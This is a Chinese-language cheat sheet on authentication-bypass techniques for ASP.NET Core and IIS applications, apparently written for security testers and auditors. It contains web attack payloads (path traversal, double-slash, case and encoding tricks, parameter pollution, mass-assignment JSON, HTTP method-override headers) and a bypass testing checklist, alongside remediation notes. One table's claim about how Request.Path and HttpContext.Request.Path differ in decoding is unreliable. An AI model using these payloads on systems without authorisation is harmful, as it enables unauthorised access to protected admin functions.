# 鉴权绕过模式

## 目录

- [一、前置知识](#一前置知识)
- [二、路径绕过](#二路径绕过)
- [三、参数绕过](#三参数绕过)
- [四、HTTP 方法绕过](#四http方法绕过)
- [五、编码绕过](#五编码绕过)
- [六、逻辑绕过](#六逻辑绕过)
- [七、框架特定绕过](#七框架特定绕过)
- [八、绕过测试清单](#八绕过测试清单)

---

## 一、前置知识

### 绕过原理概述

鉴权绕过的核心原理：不同层次/组件对同一请求的解析结果不一致

```
请求: GET /admin;.js

┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   反向代理层     │ --> │   ASP.NET 管道  │ --> │   应用框架层     │
│  Nginx/IIS      │     │  Middleware      │     │  [Authorize]    │
│  (可能原样传递) │     │  (路径规范化)    │     │  (路由匹配)      │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### ASP.NET 管道层分析

#### IIS 层

| 特征 | 分号处理 | 双斜杠处理 | 路径穿越处理 | 编码处理 |
|------|----------|------------|--------------|----------|
| IIS 7+ | 可能过滤 | 归一化 | requestFiltering | 可配置 |
| IIS 6 | 保留 | 归一化 | 部分处理 | 不解码 |

#### ASP.NET Core Middleware 层

| 路径获取方式 | 处理行为 | 安全等级 |
|-------------|----------|----------|
| `Request.Path` | 原样返回，不解码 | 危险 |
| `Request.Path.Value` | 同上 | 危险 |
| `HttpContext.Request.Path` | 已解码 | 相对安全 |

---

## 二、路径绕过

### 2.1 路径穿越绕过

**前置条件：**
- 使用 `StartsWithSegments()` 或前缀匹配
- 未对路径进行规范化处理

**Payload：**

```http
GET /admin/../admin/users HTTP/1.1
GET /public/../admin HTTP/1.1
GET /admin/./users HTTP/1.1
```

### 2.2 双斜杠绕过

**前置条件：**
- 未对路径进行双斜杠归一化
- 使用精确匹配或前缀匹配

**Payload：**

```http
GET //admin HTTP/1.1
GET /admin//users HTTP/1.1
```

### 2.3 尾部斜杠绕过

**前置条件：**
- 使用精确匹配
- ASP.NET Core 默认不匹配尾部斜杠（与 Spring 不同）

**Payload：**

```http
GET /admin/ HTTP/1.1
GET /admin/// HTTP/1.1
```

### 2.4 大小写绕过

**前置条件：**
- ASP.NET Core 路由默认区分大小写
- 但 IIS 可能不区分大小写

**Payload：**

```http
GET /Admin HTTP/1.1
GET /ADMIN HTTP/1.1
```

### 2.5 点号绕过

**前置条件：**
- 未对路径进行归一化

**Payload：**

```http
GET /admin. HTTP/1.1
GET /admin.. HTTP/1.1
GET /admin/./ HTTP/1.1
```

---

## 三、参数绕过

### 3.1 参数覆盖

```http
POST /api/updateUser HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=admin
role=user&role=admin
```

### 3.2 模型绑定注入

```json
{"userId": 1, "isAdmin": true}
{"userId": 1, "role": "Admin"}
```

### 3.3 Mass Assignment

```csharp
// 危险：模型绑定未限制属性
[HttpPost]
public async Task<IActionResult> UpdateUser(User user)
{
    // user.Role 可被客户端设置
    await _userService.UpdateAsync(user);
    return Ok();
}

// 安全：使用 DTO 限制属性
[HttpPost]
public async Task<IActionResult> UpdateUser(UserUpdateDto dto)
{
    // DTO 不包含 Role 属性
}
```

---

## 四、HTTP 方法绕过

### 4.1 方法切换

```http
GET /admin/delete HTTP/1.1
PUT /admin/delete HTTP/1.1
DELETE /admin/delete HTTP/1.1
PATCH /admin/delete HTTP/1.1
OPTIONS /admin/delete HTTP/1.1
HEAD /admin/delete HTTP/1.1
```

### 4.2 X-HTTP-Method-Override

```http
POST /admin/delete HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /admin/delete HTTP/1.1
X-HTTP-Method: DELETE
```

---

## 五、编码绕过

### 5.1 URL 编码

```http
GET /%61dmin HTTP/1.1          # a -> %61
GET /admin%2fusers HTTP/1.1    # / -> %2f
```

### 5.2 双重编码

```http
GET /%2561dmin HTTP/1.1        # %25 = %, %2561 -> %61 -> a
GET /admin%252f.. HTTP/1.1     # %252f -> %2f -> /
```

---

## 六、逻辑绕过

### 6.1 条件竞争

权限检查和操作执行非原子性

### 6.2 状态机绕过

业务流程有多个步骤，后续步骤未校验前置步骤

### 6.3 IDOR（不安全的直接对象引用）

```
正常: /api/users/1  # 被保护
绕过: /api/orders?userId=1  # 未保护，但返回用户信息
```

---

## 七、框架特定绕过

### 7.1 ASP.NET Core

| 问题 | 影响情况 | Payload | 修复方式 |
|------|----------|---------|----------|
| 中间件顺序错误 | UseAuthentication 在 UseRouting 之后 | 直接请求受保护路由 | 调整中间件顺序 |
| [AllowAnonymous] 覆盖 | 控制器级别 [Authorize] + 方法级别 [AllowAnonymous] | 直接请求方法 | 审查 AllowAnonymous 使用 |
| FallbackPolicy 未配置 | 无默认鉴权策略 | 直接请求任意路由 | 配置 FallbackPolicy |
| 静态文件中间件在鉴权之前 | app.UseStaticFiles() 在 app.UseAuthentication() 之前 | 请求静态文件路径 | 调整中间件顺序 |

### 7.2 IIS / ASP.NET (Framework)

| 问题 | 影响情况 | Payload | 修复方式 |
|------|----------|---------|----------|
| web.config location 覆盖 | 特定路径授权覆盖全局 | 请求被覆盖的路径 | 审查 location 配置 |
| machineKey 泄露 | 可伪造 Forms Auth Ticket | 使用泄露的密钥生成合法 Cookie | 轮换密钥 |
| requestFiltering 绕过 | IIS 层路径过滤可被绕过 | 编码/双重编码 | 多层校验 |
| handlerMapping 拦截 | 静态文件处理程序在鉴权之前 | 请求特定扩展名文件 | 配置 runAllManagedModules |

---

## 八、绕过测试清单

### 路径测试

```bash
/admin
/admin/
/Admin
/ADMIN
//admin
/admin//users
/admin/../admin
/public/../admin
/admin/./
/%61dmin
/admin%2f..
/admin.
/admin..
```

### 参数测试

```bash
?debug=true
?admin=1
?role=admin
?isAdmin=true
?skipAuth=1
```

### 方法测试

```bash
GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
X-HTTP-Method-Override: DELETE
```
